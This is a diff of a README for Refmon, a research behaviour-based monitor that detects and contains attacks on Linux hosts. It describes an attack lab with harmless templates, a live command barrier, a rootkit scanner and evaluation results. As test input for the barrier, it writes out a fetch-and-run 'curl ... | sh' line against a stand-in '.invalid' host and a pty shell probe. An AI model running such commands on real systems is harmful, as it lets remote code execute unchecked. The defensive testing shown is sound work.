@@ -1,207 +1,361 @@
 # Refmon
 
-Refmon (`v1.3`) detects, contains and explains attacks on endpoints and shared Linux servers by
-judging **behaviour**, not signatures. It does not try to recognise an exploit, a lure or a malware
-family. After an attack succeeds the attacker still has to act (run code, write files, connect out,
-read secrets, persist, hide processes or modules), and those actions break the role of the process
-that was exploited. Refmon watches for that consequence, so it is meant to catch attack types that
-do not exist yet.
+Refmon (`v2.0`, package `refmon 2.0.0`) detects, contains and explains attacks on endpoints and
+shared Linux servers by judging **behaviour**, not signatures. It does not try to recognise an
+exploit, a lure or a malware family. After an attack succeeds the attacker still has to act (run
+code, write files, connect out, read secrets, persist, hide), and those actions break the role of
+the process that was exploited. Refmon watches for that consequence, so it is meant to catch attack
+types that do not exist yet.
 
 ![Refmon six-stage privacy-preserving security pipeline](docs/refmon_pipeline.jpg)
 
-For every *story* of related events it asks three questions:
+**Contents:** [Status](#status) · [How it works](#how-it-works) · [Install](#install) ·
+[Quick start: the attack lab](#quick-start-the-attack-lab) · [Logs and analysis](#logs-and-analysis) ·
+[Live barrier](#live-barrier-daemon-guard-and-web-dashboard) · [Rootkit scanner](#rootkit-scanner) ·
+[Tests](#tests-and-reproduction) · [Results](#results) ·
+[Package and deployment](#package-and-deployment) · [Paper](#paper) · [Layout](#layout) ·
+[Versions](#versions)
+
+## Status
+
+Refmon is a **research reference monitor**. What exists and works today:
+
+- the full decision pipeline with a signed policy, verified by 46 golden scenarios, seeded mutation
+  matrices (886 variants in the last round) and over 1,880 automated tests;
+- an **interactive CLI attack lab** (`refmon lab`): 35 harmless attack and benign templates, each
+  judged by the live pipeline *before* it may run, with saved logs and an automatic analysis;
+- an unprivileged **live barrier** (`refmon serve`, `refmon guard`) with a token-protected local web
+  dashboard;
+- a read-only six-engine **rootkit scanner** (`refmon scan-rootkit`).
+
+What does **not** exist yet: kernel sensors that see every process, file and connection on a host,
+and an enforcer that really pauses, kills or cuts the network of a process (the repository has a
+simulated enforcer only). Until then Refmon judges what is sent to it (commands through `guard` or
+the lab, files in its watched sandbox, recorded event files); it cannot yet sit transparently
+between the users and the servers of an organisation. See [Package and deployment](#package-and-deployment)
+and [docs/phase-8-plan.md](docs/phase-8-plan.md). No real malware, exploit or personal data is in
+the repository: every scenario and template is a harmless, self-made stand-in.
+
+## How it works
+
+Every event (a program started, a file written, a connection, a pasted command ...) passes a
+six-stage pipeline:
+
+| Stage | What it does |
+|---|---|
+| **Observe** | replaces all content (commands, URLs, paths, bodies) by per-device `hmac:sha256` fingerprints and keeps only the outcome of checks done on the raw value (destination class, canary hit, entropy of the text); raw events live in memory for at most ten minutes |
+| **Tag** | puts an *origin label* on anything that came from outside (web, mail, removable media, an inbound request, a download, AI-agent input) and propagates it to child processes and written files; labels fade with a half-life unless persistent |
+| **Link** | groups related events into a *story* (process tree plus quiet window) |
+| **Judge** | asks the three questions below and scores the evidence |
+| **Gate / Contain** | turns the decision into actions: block (kill tree, cut network, quarantine new files, revert persistence, restore files) or hold (ask the user on an endpoint, pause and quarantine pending an admin on a server); every action has an undo record; only labeled objects are touched |
+| **Report** | plain-language verdicts mapped to MITRE ATT&CK tactics, under pseudonyms |
+
+The three questions, asked of every story:
 
 | Question | Fails when |
 |---|---|
-| **Origin** | the triggering input came from outside the trust boundary (web, mail, removable media, an inbound request, a downloaded package, agent input) |
-| **Contract** | a process does something outside its role: a web worker starting a shell, an interactive shell running a pasted command, any process tampering with security tools, changing many files, fanning out, or launching an unsigned external file |
+| **Origin** | the triggering input came from outside the trust boundary |
+| **Contract** | a process does something outside its role: a web worker starting a shell, a shell running pasted text, any process tampering with security tools, changing many files, fanning out, or launching an unsigned external file |
 | **Effect** | it tries a dangerous action: fetch, hide, persist, escalate, lateral movement, exfiltration, tamper, credential or protected-asset access, mass change |
 
-Three failed questions are a block, two a hold (ask the user, or pause and quarantine pending an
-admin), fewer an allow. Underneath, a monotone *evidence calculus* (`v1.3`) turns the signals into
-log-likelihood ratios (`L = L_0 + sum_q max w_j s_j`) with cost-derived Bayes thresholds
-(`tau_hold = -4.94` nats, `tau_block = -3.91` nats) and a **Contract Gate** (never auto-blocking
-without a contract violation unless an absolute override fires), while the classic 3/2/1 count stays
-as the human-readable explanation and fallback. Overrides are absolute: a canary read, a labeled
-process touching a protected asset, or tampering with Refmon itself.
+Three failed questions are a block, two a hold, fewer an allow. Underneath, a monotone *evidence
+calculus* scores the signals as log-likelihood ratios,
+`L = ln(π/(1-π)) + Σ_q max_j w_j·s_j`, starting from the prior `-6.91` nats, with cost-derived
+thresholds `τ_hold = -4.94` and `τ_block = -3.91`. A **contract gate** never blocks without a
+Contract signal. Overrides are absolute: reading a canary (decoy), a labeled process touching a
+protected asset, or tampering with Refmon itself always block. The 3/2/1 count stays as the
+human-readable explanation. Example (ClickFix paste): `-6.91 + 0.8 (origin) + 1.0 (pasted text) +
+2.5 (fetch from an unknown host) = -2.61 ≥ -3.91 → BLOCK`.
 
-Privacy is a design constraint, not a feature: content (commands, URLs, bodies, paths) is replaced
-by per-device `hmac:sha256` fingerprints inside the first stage (`Observe`), raw events live in
-memory for at most ten minutes, and only verdicts under pseudonyms leave a device. There is no
-machine learning, only deterministic rules, counted baselines (Laplace surprisal with Good-Turing
-maturity gating, dual-window Poisson burst tests, incident-frozen EMA and standardised CUSUM), and
-cryptographically signed policies (Ed25519).
-
-**Status.** Research reference monitor with an unprivileged user-space live barrier (`refmon serve`
-and `refmon guard`), a six-engine read-only cross-view rootkit sensor (`refmon scan-rootkit`), and
-full deterministic JSONL replay evaluation. No real malware, exploit or personal data is in the
-repository (every scenario uses harmless, self-made stand-ins; see
-[docs/phase-8-plan.md](docs/phase-8-plan.md) for kernel eBPF/LSM production sensors). Full
-benchmark tables across `v1.0`--`v1.3` are in [docs/results.md](docs/results.md), and the complete
-two-column LaTeX paper with formal proofs is in [documentation/main.tex](documentation/main.tex).
+There is no machine learning: deterministic rules, counted baselines (Laplace surprisal with
+Good-Turing maturity gating, dual-window Poisson burst tests, incident-frozen EMA and CUSUM), and
+policies signed with Ed25519. Nothing changes the policy without a person approving it.
 
 ## Install
 
-Python 3.12 or newer.
+Python 3.12 or newer. On the cluster `python3` is 3.6, so the Makefile uses `python3.12`.
 
 ```bash
-make install            # python3 -m venv .venv && .venv/bin/pip install -e ".[dev]"
+make install                  # .venv with python3.12, then pip (or uv) install -e ".[dev]"
 ```
 
-or, without `make`: `python3 -m venv .venv && .venv/bin/pip install -e ".[dev]"`. The package needs
-`pydantic`, `pyyaml` and `cryptography`; the tests also need `pytest`, `hypothesis` and `ruff`.
+This installs the `refmon` command into `.venv/bin/` (`.venv/bin/refmon ...` and
+`.venv/bin/python -m refmon.cli ...` are the same). Runtime dependencies: `pydantic`, `pyyaml`,
+`cryptography`; the tests also need `pytest`, `hypothesis` and `ruff`.
 
-## Run the live barrier and web dashboard
+## Quick start: the attack lab
 
-Refmon can run completely in unprivileged user space (no `root` required), making it straightforward
-to test and operate on shared Linux nodes and HPC clusters.
+```bash
+make lab                                         # interactive menu
+.venv/bin/python -m refmon.cli lab --help        # step-by-step test guide (in the lab: guide)
+.venv/bin/python -m refmon.cli lab --test-all    # all 35 templates, results table, analysis, saved logs
+```
 
-### 1. Start the background barrier daemon (`Terminal 1`)
+The lab shows a menu of 35 templates: 28 attacks (ClickFix and obfuscated pastes, a base64 mail
+one-liner, AI prompt injection, reverse shells, a reverse SSH tunnel, `LD_PRELOAD`, SUID and `sudo`
+escalation, a privileged container, credential and SSH-key theft, a canary, exfiltration of the
+home tree, persistence via `.bashrc`, git hooks and cron, killing Refmon, stopping auditd, wiping
+history, ransomware encryption, a wiper, web-worker RCE, typosquatting, a web-shell drop and a
+60-file ransomware burst), one known limit and six benign controls. Every command goes through the
+live pipeline **before** it may run; only what Refmon allows is executed, in the sandbox (working
+directory `attack-lab/sandbox/workspace`, `HOME` = a fake home with fake keys, 5 s timeout).
+
+At the `refmon-lab>` prompt:
+
+| Type | Does |
+|---|---|
+| `1`, `clickfix`, `1-9`, `attacks`, `benign`, `all` | run templates |
+| `$ <command>` | your own command: Refmon judges it first, runs it only if allowed (a hold asks you) |
+| `o web` / `o mail` / `o agent_input` / `o none` | the origin of your own commands (pasted from a web page, ...) |
+| `e 3` | edit template 3 and run your variant |
+| `m block` / `m warn` / `m observe` | enforce, or only log (re-signs the policy) |
+| `table`, `results`, `analysis`, `s` | attack table, results so far, what they mean, score |
+| `test-all`, `save` | run everything and save / save what you ran |
+| `h`, `guide`, `q` | help, walkthrough, quit (saves the session) |
+
+Without the menu:
+
+```bash
+.venv/bin/python -m refmon.cli lab --table                       # table of all attacks
+.venv/bin/python -m refmon.cli lab --run 1 13 web_shell --save   # some templates, saved
+.venv/bin/python -m refmon.cli lab --test-all --mode observe     # what gets through when Refmon only logs
+.venv/bin/python -m refmon.cli lab --analyze                     # analysis of the newest saved run
+.venv/bin/python -m refmon.cli lab --compare attack-lab/runs/run-*   # saved runs side by side
+```
+
+`--test-all` exits with 0 when every check passed (usable in scripts). Every template is a harmless
+stand-in (`.invalid` hosts that never resolve, fake credentials). The templates that would touch the
+real system if they ran (`sudo`, `crontab`, `systemctl`, `pkill`, `docker`, `rm -rf ~`, `tar ~`) are
+judged but never executed, even when Refmon allows them or the mode only logs. Your own `$` commands
+do run when allowed. The full attack table and a reference run are in
+[docs/attack-lab.md](docs/attack-lab.md).
+
+## Logs and analysis
+
+Everything the lab writes is in **`attack-lab/`** in the repository (gitignored: it holds the
+private signing key), whichever directory you start it from:
+
+```text
+attack-lab/
+├── logs/            Refmon's own logs
+│   ├── barrier.log      readable: every verdict, quarantine and mode change   (tail -f it)
+│   ├── verdicts.jsonl   every verdict in full
+│   └── events.jsonl     every observed event, content only as hmac: fingerprints
+├── runs/            one folder per saved run: run-<UTC time>/
+│   ├── report.md        summary, analysis, score per category, results table, every explanation
+│   ├── analysis.txt     the analysis only
+│   ├── results.csv      one row per command (spreadsheet)
+│   ├── results.jsonl    the same, every field (scripts)
+│   ├── summary.json     totals, thresholds, weights, version, git commit, policy digest
+│   ├── templates.md     the attack table
+│   └── console.log      the screen output
+├── sandbox/         fakehome/, workspace/, web_root/, secrets/ (the canary)
+├── quarantine/      files Refmon moved away (mode 0400, never deleted)
+└── policy.yaml, admin.key, admin.pub, device.key, api.token
+```
+
+The **analysis** (`lab --analyze`, `analysis` in the lab, top of `report.md`) explains a run:
+detection and prevention rates; which of the three questions caught each attack; the overrides;
+the evidence margin of every block above `τ_block`; what each block becomes when **any one of its
+signals is removed** (computed from the policy weights, with the contract gate); the benign command closest to a false alarm;
+pairs of malicious and harmless commands that get identical evidence (blind spots); how often each
+signal fired; where the evidence calculus overruled the 3/2/1 rule; and the decision time.
+
+Your own `$` commands are stored in saved runs only as an `hmac:` fingerprint without output,
+unless the lab is started with `--record-own-commands`. To use other locations: `--workdir DIR`
+(the whole lab folder) and `--report-dir DIR` (saved runs only).
+
+**Changing the policy.** `attack-lab/policy.yaml` is signed. The mode can be switched in the lab
+(`m observe`). For anything else, edit the file and sign it again, otherwise Refmon refuses to start:
+
+```bash
+.venv/bin/python -m refmon.cli sign   attack-lab/policy.yaml attack-lab/admin.key
+.venv/bin/python -m refmon.cli verify attack-lab/policy.yaml "$(cat attack-lab/admin.pub)"
+```
+
+For example, adding the university's hosts under `destinations:` with `trusted: true` turns a
+`curl` to those hosts from HOLD (unknown destination) into ALLOW. `rm -rf attack-lab` starts over
+with a fresh policy.
+
+## Live barrier: daemon, guard and web dashboard
+
+The live barrier runs completely in unprivileged user space. Start the daemon (terminal 1):
 
 ```bash
 make serve
-# or with custom port / private state directory:
 .venv/bin/python -m refmon.cli serve --host 127.0.0.1 --port 8765 --workdir ./my-refmon-state
 ```
 
 On startup `serve` creates a private `0700` state directory (default `/tmp/refmon-live-<uid>`),
-generates an Ed25519 keypair, signs `policy.yaml` in `block` mode, starts the background directory
-watcher (`400 ms` poll), and prints a token-authenticated local URL:
+generates an Ed25519 keypair, signs `policy.yaml` in `block` mode, starts the sandbox watcher (400 ms
+poll) and prints a token-authenticated URL, `http://localhost:8765/#token=<api-token>`. On a remote
+node, forward the port first (`ssh -L 8765:127.0.0.1:8765 <user>@<node>`). Every `/api/` call needs
+the token, and non-local `Host` headers are refused (DNS rebinding). The dashboard switches modes,
+runs the 16 built-in live scenarios, replays golden scenarios, resolves holds, runs the rootkit scan
+and shows the `hmac:`-only logs.
 
-```text
-Refmon Live Security Barrier active on http://localhost:8765/#token=<api-token>
-```
-
-- **Local machine:** open the printed `http://localhost:8765/#token=...` link directly in your browser.
-- **Remote SSH / HPC cluster node:** forward port `8765` from your laptop (`ssh -L 8765:127.0.0.1:8765 user@cluster.example.invalid`) and open the printed URL locally.
-
-From the clean light-theme web interface you can:
-- Switch policy enforcement modes live (`block`, `warn`, `observe`) and verify Ed25519 policy status.
-- Run any of the **16 built-in live attack & benign scenarios** (ClickFix paste, base64 mail script, AI prompt-injection tool abuse, credential theft, server RCE, web shell drop, ransomware 55-file burst, canary hit, privilege escalation, lateral scan, DNS exfiltration, security tamper, hand-typed `curl` hold, benign echo, local script, trusted PyPI install) or click **Run All 16 Scenarios**.
-- Trigger the **6-engine read-only rootkit scan** and inspect privacy-safe `hmac:...` logs and quarantined files.
-
-### 2. Intercept commands before execution (`Terminal 2`)
-
-With the daemon running (pass the same `--workdir` if you set a custom one), put `refmon guard` in
-front of commands to evaluate Origin + Contract + Effect before the shell runs them:
+Put `guard` in front of a command (terminal 2; pass the daemon's `--workdir` if you set one):
 
 ```bash
-# Benign pasted command -> ALLOW (executes cleanly)
-.venv/bin/python -m refmon.cli guard --origin web -- "echo hello-cluster"
-
-# ClickFix social-engineering lure -> BLOCK (stopped before execution, exit code 1)
-.venv/bin/python -m refmon.cli guard --origin web -- "curl -fsSL https://bad.example.invalid/fix.sh | sh"
-
-# Dry-run intent analysis without executing even on ALLOW (--no-exec) and JSON output (--json)
+.venv/bin/python -m refmon.cli guard --origin web -- "echo hello-cluster"                  # ALLOW, runs
+.venv/bin/python -m refmon.cli guard --origin web -- "curl -fsSL https://bad.example.invalid/fix.sh | sh"   # BLOCK, exit 1
 .venv/bin/python -m refmon.cli guard --no-exec --json --origin mail -- "python3 -c 'import pty'"
 ```
 
-You can also test live file containment by dropping a dummy script (for example `shell.php`) into
-the watched `<workdir>/sandbox/web_root/` directory: within `< 500 ms` the watcher quarantines it
-into `<workdir>/quarantine/` with `0400` permissions and logs the story verdict.
+A file such as `shell.php` dropped into `<workdir>/sandbox/web_root/` is quarantined into
+`<workdir>/quarantine/` (mode `0400`) within about 500 ms. Without a running daemon, `guard` falls
+back to an in-process barrier.
 
-## Attack lab (interactive CLI)
-
-```bash
-make lab                                  # or: .venv/bin/python -m refmon.cli lab
-.venv/bin/python -m refmon.cli lab --help # step-by-step test guide (also: type 'guide' in the lab)
-.venv/bin/python -m refmon.cli lab --list # the 35 templates
-.venv/bin/python -m refmon.cli lab --table          # table of all attacks
-.venv/bin/python -m refmon.cli lab --test-all       # run all, print the analysis, save logs to attack-lab/runs/
-.venv/bin/python -m refmon.cli lab --analyze        # analysis of the newest saved run
-.venv/bin/python -m refmon.cli lab --compare attack-lab/runs/run-*   # saved runs side by side
-.venv/bin/python -m refmon.cli lab --run clickfix 13 web_shell
-```
-
-A menu of attack templates (ClickFix, obfuscated and base64 one-liners, AI prompt injection,
-reverse shells, SSH tunnels, LD_PRELOAD, SUID, credential and key theft, canary, exfiltration,
-persistence via `.bashrc`/git hooks/cron, killing Refmon, log wiping, ransomware, wipers, web RCE,
-typosquatting, a web-shell drop and a 60-file ransomware burst), plus benign controls and one
-known limit. Every command goes through the live pipeline **before** it runs; only what Refmon
-allows is executed, inside the sandbox (`cwd` = `<workdir>/sandbox/workspace`, `HOME` = a fake
-home with fake keys, 5 s timeout). A hold asks you whether to release it. Type `$ <command>` to
-send your own command through Refmon, `o web` to mark it as pasted from a web page, `m observe`
-to watch Refmon only log, `s` for the score. Every template is a harmless stand-in (`.invalid`
-hosts, fake credentials); the ones that would touch the real system (`sudo`, `crontab`,
-`systemctl`, `pkill`, `docker`, `rm -rf ~`, `tar ~`) are judged but never executed. State lives
-in `attack-lab/` inside the repository (gitignored; `--workdir` for another place): the signed
-policy and keys, the sandbox, `quarantine/`, Refmon's own logs in `logs/` (`barrier.log`,
-`verdicts.jsonl`, `events.jsonl`) and one folder per saved run in `runs/` (`report.md` with the
-analysis, `analysis.txt`, `results.csv`, `results.jsonl`, `summary.json`, `console.log`).
-All attacks and a reference run are tabled in [docs/attack-lab.md](docs/attack-lab.md).
-
-## Run the six-engine rootkit scanner
+## Rootkit scanner
 
 ```bash
 make scan-rootkit
-# or directly with options:
-.venv/bin/python -m refmon.cli scan-rootkit --passes 2 --interval-ms 50
-.venv/bin/python -m refmon.cli scan-rootkit --json
+.venv/bin/python -m refmon.cli scan-rootkit --passes 2 --interval-ms 50 [--json] [--with-external]
 ```
 
-`scan-rootkit` inspects the host in read-only user space across six engines without requiring `root`:
-1. **Dynamic linker hijacking** (`/etc/ld.so.preload`, `LD_PRELOAD`, `LD_AUDIT`, ephemeral `LD_LIBRARY_PATH`, deleted `.so` mappings).
-2. **Fileless execution & memory injection** (`memfd:` execution, deleted `/proc/[pid]/exe`, `/dev/shm` or `/tmp` binaries, non-zero `TracerPid`, anonymous `rwxp` segments).
-3. **Kernel module cross-view & taint decoding** (`/sys/module` minus `/proc/modules`, plus `/proc/sys/kernel/taint` distinguishing forced module loads from benign proprietary GPU/DKMS drivers).
-4. **Process cross-view** (`/proc` readdir listing vs thread groups and own-UID ancestry, across `m >= 2` passes to suppress transient OS race churn).
-5. **Network socket cross-view & sniffers** (`/proc/net/sockstat` `TCP: inuse` vs `/proc/net/tcp` entries, plus `IFF_PROMISC` packet-sniffer flags).
-6. **External scanner bridge** (optional read-only integration with `unhide`, `chkrootkit` or `rkhunter` when `--with-external` is passed; missing tools are neutral).
+Read-only, no `root` needed, six engines: dynamic-linker hijacking (`ld.so.preload`, `LD_PRELOAD`,
+`LD_AUDIT`, deleted `.so` mappings); fileless execution (`memfd:`, deleted `/proc/<pid>/exe`,
+binaries in `/dev/shm` or `/tmp`, `TracerPid`, anonymous `rwxp`); kernel-module cross-view and taint
+decoding; process cross-view across `m ≥ 2` passes; socket cross-view and promiscuous interfaces;
+optional `unhide`/`chkrootkit`/`rkhunter` bridge.
 
-## Run the tests
+## Tests and reproduction
 
 ```bash
-make test               # .venv/bin/python -m pytest -q
-make all                # lint, tests, privacy audit, robustness matrix, publishability check
+make test                                                 # all tests, about one minute
+.venv/bin/python -m pytest -q tests/test_attacklab.py     # only the attack lab
+make lint                                                 # ruff check + format check
+make all                                                  # lint, tests, privacy audit, robustness matrix, publishability check
+make reproduce                                            # regenerate every result table (slow)
 ```
 
-The suite contains over sixteen hundred tests (unit tests per rule, contract, effect, override,
-rootkit sensor and live barrier; property tests with Hypothesis; replay of all 46 golden scenarios;
-the privacy audit; the startup self-test) and finishes in under a minute.
+Over 1,880 tests: unit tests per rule, contract, effect and override; Hypothesis property tests
+(labels never lost, no raw content after Observe, Contain never touches an unlabeled object, ...);
+replay of the 46 golden scenarios; the privacy audit; rootkit, live-barrier, CLI and attack-lab
+tests. One test is an expected failure (`xfail`): a documented limit of the S19 stand-in.
+`make reproduce` regenerates the variant matrices from the pre-registered seeds, replays them in
+every tagged version, compares them with Wilson intervals and exact McNemar tests, and refreshes
+[docs/results.md](docs/results.md). `scripts/check_publishable.py` checks that no secret, home path
+or personal data is in the tree or the history.
 
-## Reproduce every result
+## Results
+
+**Golden catalog:** 46/46 scenarios reach their expected decision.
+
+**Seeded mutation matrix (v2.0, pre-registered seed `171139148`, 886 variants):**
+
+| | v1.7 | v2.0 |
+|---|---:|---:|
+| malicious contained (block + effective hold), of 635 | 625 (98.4 %) | **625 (98.4 %, Wilson [97.1, 99.1])** |
+| malicious blocked outright | 483 | 483 |
+| neutral benign allow / hold / block, of 158 | 132 / 24 / 2 | **137 / 21 / 0** |
+| neutral false-block rate | 1.3 % | **0.0 % [0.0, 2.4]** |
+
+**Attack lab (`lab --test-all`, block mode):**
+
+| | |
+|---|---|
+| attacks detected (block or hold) | **28/28** |
+| attacks stopped (never ran or quarantined) | **27/28**; the 60-file burst is detected after the files are written |
+| benign commands allowed | **6/6**, no false alarm |
+| known limit (a script run by name) | missed, as documented |
+| decision time | median 3.9 ms per command, before it runs |
+
+What the analysis of that run shows:
+- Contract failed in 27/28 attacks, Effect in 27/28, Origin in 24/28; four attacks (`canary`,
+  `kill_refmon`, `wipe_home`, `ransom_burst`) were caught **with no outside origin at all**, which is
+  the point of judging consequences rather than entry.
+- **Remove any one signal** from the 22 score-based blocks (the other six are overrides): **9 would
+  be allowed silently**, 12 only held (mostly by the contract gate), 1 stays blocked. For a pasted
+  command, origin and contract alone give exactly `-5.11`, just under `τ_hold` (by design: scenario
+  S11, harmless pasted commands are not interrupted), so those nine blocks rest on the
+  pre-execution analysis seeing one dangerous Effect in the command text.
+- The harmless `pasted_echo` sits **0.17 nats** under `τ_hold`, and the malicious `hidden_script`
+  gets the **same evidence**: from command text alone they cannot be told apart. A tutorial command
+  that downloads from a host not in the policy is blocked like ClickFix, so a deployment must list
+  its own trusted hosts.
+- The calculus overruled the 3/2/1 rule five times: three 2-fail attacks become BLOCK instead of
+  HOLD, two pasted 2-fail commands become ALLOW instead of HOLD.
+
+Version history and every table: [docs/results.md](docs/results.md),
+[docs/v2.0-evaluation.md](docs/v2.0-evaluation.md), [docs/attack-lab.md](docs/attack-lab.md).
+
+## Package and deployment
+
+**What Refmon is now.** A normal Python package (`pyproject.toml`, build backend `hatchling`,
+version `2.0.0`). `pip install .` (or `pip install git+https://github.com/parsabe/Refmon.git`)
+installs the library and one command, `refmon`, with these subcommands:
+
+| Subcommand | Kind |
+|---|---|
+| `lab` | the interactive attack lab |
+| `serve` | long-running daemon: barrier, sandbox watcher, local web dashboard |
+| `guard` | one-shot client: judge a command before it runs |
+| `scan-rootkit` | one-shot read-only host scan |
+| `keygen`, `init-policy`, `sign`, `verify` | the signed policy |
+| `learn`, `approve`, `apply` | contract learning: proposals that a person approves |
+| `audit` | the privacy audit |
+
+Installed outside the repository, everything except the golden replay works (the 46 golden files
+live in `tests/golden/` and are not part of the wheel); the lab then writes `attack-lab/` in the
+current directory.
+
+**Running all the time.** Only `serve` is meant to run continuously. Today it runs as your own user
+and can be kept alive with `tmux`, `nohup` or a `systemd --user` unit where the host allows that.
+Running always does not make it a barrier for the whole host: it still sees only what is sent to it
+and its own sandbox, and its enforcer is simulated.
+
+**What a deployment between users and servers needs** (Phase 8 and 9 of `CLAUDE.md`; details in
+[docs/phase-8-plan.md](docs/phase-8-plan.md)):
+
+1. Agreement of the operator: the computing centre's IT security, and for monitoring staff
+   machines in Germany also the data protection officer (a DPIA) and the staff council.
+2. An isolated lab VM with root access, snapshots and no internet.
+3. A kernel **sensor** behind `Sensor.emit` (eBPF, or `auditd`/`fanotify` to start): process
+   execution and ancestry, file writes, connections, privilege changes, persistence, tampering.
+4. A real **enforcer** behind `Enforcer.act`: `SIGSTOP`/cgroup freezer for holds, tree kill,
+   nftables network cut, root-owned quarantine, each with its undo.
+5. Lab validation: every scenario as a real harmless stand-in; lab verdicts must equal replay
+   verdicts; measured per-event overhead.
+6. A site policy: real destinations and trusted sources, roles for the site's servers, contracts
+   learned in learning mode and approved by a person.
+7. A pilot in observe mode, measured against the targets fixed in advance (no benign block per
+   week, at most one hold per user per week), then warn and block, role by role, as a root-owned
+   system service with central pseudonymous reporting and heartbeat monitoring.
+
+## Paper
+
+The two-column LaTeX paper (method, mathematics, algorithms, experiments including the attack lab,
+discussion, deployment status, and the proofs in the appendices) is in [documentation/](documentation/):
 
 ```bash
-make reproduce          # .venv/bin/python scripts/reproduce.py
-```
-
-This generates the 879 variants of the active pre-registered seed (`654514256`) once, extracts git
-tags `v1.0` to `v1.3`, replays the identical event stream in each, compares the four versions with
-Wilson 95% confidence intervals and paired exact McNemar tests against `docs/evaluation/`, runs the
-46 golden scenarios in every version, builds the coverage map, runs the privacy audit, the
-publishability check and the test suite, and updates the generated blocks of
-[docs/results.md](docs/results.md).
-
-## Build the two-column LaTeX paper
-
-The full publication manuscript (Abstract, Introduction, Background & Related Work, Methodology &
-Mathematics with TikZ diagrams and pipeline figures, Algorithms & Experiments, Discussion, Future
-Work, Conclusion, AI Disclosure, References, and Appendices A--G with mathematical proofs) lives in
-[`documentation/`](documentation/):
-
-```bash
-make -C documentation pdf           # compiles documentation/main.pdf via pdflatex (twice)
-make -C documentation overleaf-zip  # packages refmon-paper-overleaf.zip for Overleaf
+make -C documentation pdf            # documentation/main.pdf (pdflatex, twice)
+make -C documentation diagrams       # the level-by-level diagram book
+make -C documentation overleaf-zip   # refmon-paper-overleaf.zip
 ```
 
 ## Layout
 
 | Path | What |
 |---|---|
-| `src/refmon/` | `pipeline/` (`Observe`, `Tag`, `Link`, `Judge`, `Rates`), `calculus/` (Bayesian LLR, decay/Noisy-OR, Laplace/Good-Turing rarity, Poisson/CUSUM, DP/Bloom), `gate.py` & `contain.py` (reversible containment), `intent.py` (pre-exec command intent), `live.py` & `live_ui.py` (live barrier daemon & light-theme web UI), `rootkit.py` (6-engine rootkit scanner), `exposure.py`, `selftest.py`, `heartbeat.py`, `report.py`, `variants.py` |
-| `tests/` | unit, property, live-barrier, rootkit and replay tests; `tests/golden/` has the 46 scenarios (`Sxx.events.jsonl`, `Sxx.expected.json`) |
+| `src/refmon/pipeline/` | `observe`, `tag`, `link`, `judge`, `rates`, `signals`, `features`, `pipeline` |
+| `src/refmon/calculus/` | evidence (log-likelihood ratios, thresholds), labels (decay, noisy-OR), rarity (Laplace, Good-Turing), stats (Poisson, CUSUM), privacy (Laplace noise, k-anonymity, Bloom) |
+| `src/refmon/schemas/` | typed models: events, labels, stories, contracts, verdicts, actions |
+| `src/refmon/` | `gate.py`, `contain.py` (reversible containment), `policy*.py`, `signing.py`, `learning.py`, `tune.py`, `exposure.py`, `selftest.py`, `heartbeat.py`, `report.py`, `pseudonym.py`, `audit.py`, `variants.py`, `intent.py` (pre-execution command intent), `live.py`, `live_ui.py` (daemon and dashboard), `rootkit.py`, `attacklab.py`, `labreport.py` (attack lab, tables, saved runs, analysis), `cli.py` |
+| `tests/` | unit, property, replay, live, rootkit and lab tests; `tests/golden/` holds the 46 scenarios |
 | `scripts/` | `reproduce.py`, `generate_variants.py`, `dump_matrix.py`, `compare_versions.py`, `check_publishable.py` |
-| `docs/` | `results.md` (final tables), `refmon_pipeline.jpg`, `design-decisions.md` (A1 to A58+), `progress.md`, `review-list.md`, `variant-seeds.md`, `v1.x-evaluation.md`, `phase-8-plan.md` |
-| `documentation/` | `main.tex`, `main.pdf`, `references.bib`, `Makefile`, `figures/` (two-column LaTeX paper and full mathematical proofs) |
-| `CLAUDE.md` | the specification: architecture, golden catalog, evidence calculus (C11), coverage map (C13). Tests verify weights and coverage directly against it |
-
-Policy and administration CLI subcommands:
-`refmon keygen | init-policy | sign | verify | learn | approve | apply | audit | scan-rootkit | serve | guard`.
+| `docs/` | `results.md`, `attack-lab.md`, `design-decisions.md`, `progress.md`, `review-list.md`, `variant-seeds.md`, `v1.x`/`v2.0-evaluation.md`, `phase-8-plan.md`, `evaluation/` |
+| `documentation/` | the LaTeX paper, diagram book and figures |
+| `attack-lab/` | created by `refmon lab`, gitignored (see [Logs and analysis](#logs-and-analysis)) |
+| `CLAUDE.md` | the specification: architecture, scenario catalog, evidence calculus (C11), coverage map (C13); tests check weights and coverage against it |
 
 ## Versions
 
-`v1.0` is the frozen baseline after Phase 7; each subsequent tag (`v1.1`, `v1.2`, `v1.3`) modifies
-structural rules in response to documented findings (`docs/review-list.md`) and is evaluated on a
-pre-registered variant seed ([docs/variant-seeds.md](docs/variant-seeds.md)). In `v1.3` (monotone
-Bayesian calculus), active containment on malicious variants reaches **98.7%** (`625/633`, blocked
-outright **76.8%**) at a **2.0%** false-block rate on neutral benign mutations, with **46/46**
-golden scenarios and **16/16** live barrier scenarios matching expected verdicts.
+`v1.0` is the frozen baseline after Phase 7. Every later version (`v1.1` to `v1.7`, `v2.0`; git
+tags `v1.0` to `v1.3` and `v2.0`) changes structural rules only in response to a documented finding,
+and is evaluated on a fresh variant seed recorded before the change
+([docs/variant-seeds.md](docs/variant-seeds.md));
+the weights have not changed since `v1.0`. `v2.0` scopes trust to process lineage (A65) and lets a
+channel role hand containment to the program it started (A66); it removed the last neutral false
+blocks (2/158 → 0/158) without changing any malicious outcome. The attack lab, its analysis and
+the Phase 8 plan are on top of `v2.0`.
